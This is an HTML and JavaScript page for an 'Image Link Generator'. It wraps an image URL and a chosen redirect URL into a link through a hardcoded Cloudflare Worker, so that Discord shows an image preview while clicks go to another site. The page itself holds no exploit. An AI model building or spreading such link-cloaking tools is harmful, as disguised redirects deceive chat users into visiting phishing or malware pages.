<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <title>Image Link Generator</title>

    <style>
        * {
            box-sizing: border-box;
        }

        body {
            margin: 0;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;

            background: #111214;
            color: #ffffff;

            font-family: Arial, sans-serif;
        }

        .box {
            width: 90%;
            max-width: 650px;

            background: #1e1f22;

            padding: 30px;

            border-radius: 12px;
        }

        h1 {
            margin-top: 0;
        }

        p {
            color: #b5bac1;
        }

        label {
            display: block;

            margin-top: 20px;
            margin-bottom: 7px;

            font-weight: bold;
        }

        input {
            width: 100%;

            padding: 13px;

            border-radius: 6px;
            border: 1px solid #404249;

            background: #2b2d31;
            color: white;

            font-size: 15px;
        }

        input:focus {
            outline: none;
            border-color: #5865f2;
        }

        button {
            width: 100%;

            margin-top: 22px;
            padding: 13px;

            border: none;
            border-radius: 6px;

            background: #5865f2;
            color: white;

            font-size: 16px;
            font-weight: bold;

            cursor: pointer;
        }

        button:hover {
            background: #4752c4;
        }

        .copy {
            background: #248046;
        }

        .copy:hover {
            background: #1a6334;
        }

        .result {
            display: none;

            margin-top: 25px;
        }

        .url {
            padding: 12px;

            background: #111214;

            border-radius: 6px;

            word-break: break-all;

            color: #dbdee1;
        }

        .error {
            display: none;

            margin-top: 15px;
            padding: 12px;

            background: #5c1f1f;

            border-radius: 6px;

            color: #ffb8b8;
        }
    </style>
</head>

<body>

<div class="box">

    <h1>Image Link Generator</h1>

    <p>
        Create a Discord image link that redirects visitors
        to the website you choose.
    </p>


    <label for="image">
        Image / GIF URL
    </label>

    <input
        id="image"
        type="url"
        placeholder="https://example.com/image.gif"
        autocomplete="off"
    >


    <label for="redirect">
        Redirect URL
    </label>

    <input
        id="redirect"
        type="url"
        placeholder="https://example.com/"
        autocomplete="off"
    >


    <button onclick="generate()">
        Generate Link
    </button>


    <div id="error" class="error"></div>


    <div id="result" class="result">

        <label>
            Your Discord Link
        </label>

        <div id="output" class="url"></div>

        <button class="copy" onclick="copyLink()">
            Copy Link
        </button>

    </div>

</div>


<script>

    /*
     * YOUR CLOUDFLARE WORKER
     */

    const WORKER_URL =
        "https://discord-image-redirect.bmanb0201.workers.dev/";


    function error(message) {

        const box =
            document.getElementById("error");

        box.textContent = message;

        box.style.display = "block";
    }


    function generate() {

        const image =
            document.getElementById("image").value.trim();

        const redirect =
            document.getElementById("redirect").value.trim();


        document.getElementById("error")
            .style.display = "none";


        if (!image) {

            error("Enter an image or GIF URL.");

            return;
        }


        if (!redirect) {

            error("Enter a redirect URL.");

            return;
        }


        let imageURL;
        let redirectURL;


        try {

            imageURL = new URL(image);
            redirectURL = new URL(redirect);

        } catch {

            error("One of the URLs is invalid.");

            return;
        }


        if (
            imageURL.protocol !== "http:" &&
            imageURL.protocol !== "https:"
        ) {

            error("The image must use HTTP or HTTPS.");

            return;
        }


        if (
            redirectURL.protocol !== "http:" &&
            redirectURL.protocol !== "https:"
        ) {

            error("The redirect must use HTTP or HTTPS.");

            return;
        }


        /*
         * Build the Worker URL.
         */

        const worker =
            new URL(WORKER_URL);


        worker.searchParams.set(
            "image",
            imageURL.href
        );


        worker.searchParams.set(
            "redirect",
            redirectURL.href
        );


        const finalURL =
            worker.toString();


        document.getElementById(
            "output"
        ).textContent = finalURL;


        document.getElementById(
            "result"
        ).style.display = "block";
    }


    async function copyLink() {

        const value =
            document.getElementById(
                "output"
            ).textContent;


        try {

            await navigator.clipboard.writeText(value);

            const button =
                document.querySelector(".copy");


            button.textContent =
                "Copied!";


            setTimeout(() => {

                button.textContent =
                    "Copy Link";

            }, 1500);

        } catch {

            alert(
                "Copy failed. Select the link manually."
            );
        }
    }

</script>

</body>
</html>
